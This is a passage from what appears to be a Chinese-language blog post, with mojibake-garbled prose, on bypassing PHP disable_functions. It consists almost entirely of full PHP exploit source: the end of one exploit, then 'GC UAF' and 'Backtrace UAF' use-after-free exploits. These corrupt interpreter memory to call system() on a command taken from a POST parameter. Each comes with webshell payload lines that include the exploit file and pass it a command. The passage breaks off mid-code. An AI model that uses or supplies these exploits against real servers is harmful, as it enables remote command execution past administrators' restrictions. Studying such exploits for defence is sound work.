&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># find system entry</span></span><br><span class="line">        <span class="keyword">if</span>(!($zif_system = <span class="keyword">$this</span>-&gt;get_system($basic_funcs))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy hashtable offsetGet bucket</span></span><br><span class="line">        $fake_bkt_off = <span class="number">0x70</span> * <span class="number">5</span> - <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        $function_data = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x50</span>);</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">4</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_bkt_off + $i * <span class="number">8</span>, </span><br><span class="line">                <span class="keyword">$this</span>-&gt;leak2($function_data + <span class="number">0x40</span> * <span class="number">4</span>, $i * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake bucket</span></span><br><span class="line">        $fake_bkt_addr = $abc_addr + $fake_bkt_off;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x50</span>, $fake_bkt_addr);</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">3</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">0x58</span> + $i * <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy bucket zval</span></span><br><span class="line">        $function_zval = <span class="keyword">$this</span>-&gt;str2ptr(<span class="keyword">$this</span>-&gt;abc, $fake_bkt_off);</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">12</span>; $i++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc,  $fake_bkt_off + <span class="number">0x70</span> + $i * <span class="number">8</span>, </span><br><span class="line">                <span class="keyword">$this</span>-&gt;leak2($function_zval, $i * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># pwn</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_bkt_off + <span class="number">0x70</span> + <span class="number">0x30</span>, $zif_system);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_bkt_off, $fake_bkt_addr + <span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line">        $spl1-&gt;offsetGet($cmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$y = [<span class="keyword">new</span> Z()];</span><br><span class="line">json_encode([&amp;$y]);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ant=include(&#x27;/tmp/fe1w0.php&#x27;);&amp;pass=whoami</span><br></pre></td></tr></table></figure>

<h3 id="0x06-GC-UAF"><a href="#0x06-GC-UAF" class="headerlink" title="0x06 GC UAF"></a>0x06 GC UAF</h3><p>åˆ©ç”¨çš„æ˜¯PHP garbage collectorç¨‹åºä¸­çš„å †æº¢å‡ºè§¦å‘ï¼Œå½±å“èŒƒå›´ä¸º7.0-1.3</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn($_POST[<span class="string">&quot;pass&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params">$cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params">$ptr, $m = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $out = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;$str, $p, $v, $n = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">$addr, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params">$base</span>) </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params">$base, $elf</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params">$binary_leak</span>) </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params">$basic_funcs</span>) </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $ryat;</span><br><span class="line">        <span class="keyword">var</span> $chtg;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    $poc = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    $abc = $out[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ant=include(&#x27;/tmp/exp2.php&#x27;);&amp;pass=whoami</span><br></pre></td></tr></table></figure>

<h3 id="0x07-Backtrace-UAF"><a href="#0x07-Backtrace-UAF" class="headerlink" title="0x07 Backtrace UAF"></a>0x07 Backtrace UAF</h3><p>å½±å“ç‰ˆæœ¬æ˜¯7.0-7.4</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn($_POST[<span class="string">&quot;pass&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params">$cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> $backtrace; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            $backtrace = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>($backtrace[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) 